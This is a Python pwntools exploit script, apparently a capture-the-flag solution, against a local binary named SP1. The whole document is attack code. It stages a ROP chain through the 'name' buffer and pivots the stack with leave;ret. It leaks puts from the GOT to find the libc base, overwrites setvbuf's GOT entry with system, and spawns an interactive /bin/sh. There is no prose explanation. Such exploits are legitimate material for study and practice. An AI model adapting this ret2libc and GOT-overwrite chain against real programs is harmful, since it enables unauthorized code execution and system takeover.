from pwn import *

p = process('./SP1')

pop_rdi_ret = 0x401293
pop_rsi_r15_ret = 0x401291
pop_rdx_ret = 0x40119e
leave_ret = 0x40121f

puts_plt = 0x401070
puts_got = 0x404018
read_plt = 0x401090
setvbuf_plt = 0x4010a0
setvbuf_got = 0x404030

name = 0x404080

payload = b'A' * 0x700
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_r15_ret)
payload += p64(setvbuf_got)
payload += p64(0)
payload += p64(pop_rdx_ret)
payload += p64(16)
payload += p64(read_plt)
payload += p64(pop_rdi_ret)
payload += p64(setvbuf_got + 8)
payload += p64(setvbuf_plt)

p.sendafter(b'name?: ', payload)

payload = b'A' * 0x20
payload += p64(name + 0x700)
payload += p64(leave_ret)

p.sendafter(b'comment?: ', payload)

p.recvline()
puts_libc = u64(p.recvn(6) + b'\x00\x00')
libc_base = puts_libc - 0x84420
system_libc = libc_base + 0x52290

print('puts_libc: ', hex(puts_libc))
print('libc_base: ', hex(libc_base))
print('system_libc: ', hex(system_libc))

payload = p64(system_libc)
payload += b'/bin/sh\x00'
p.send(payload)

p.interactive()
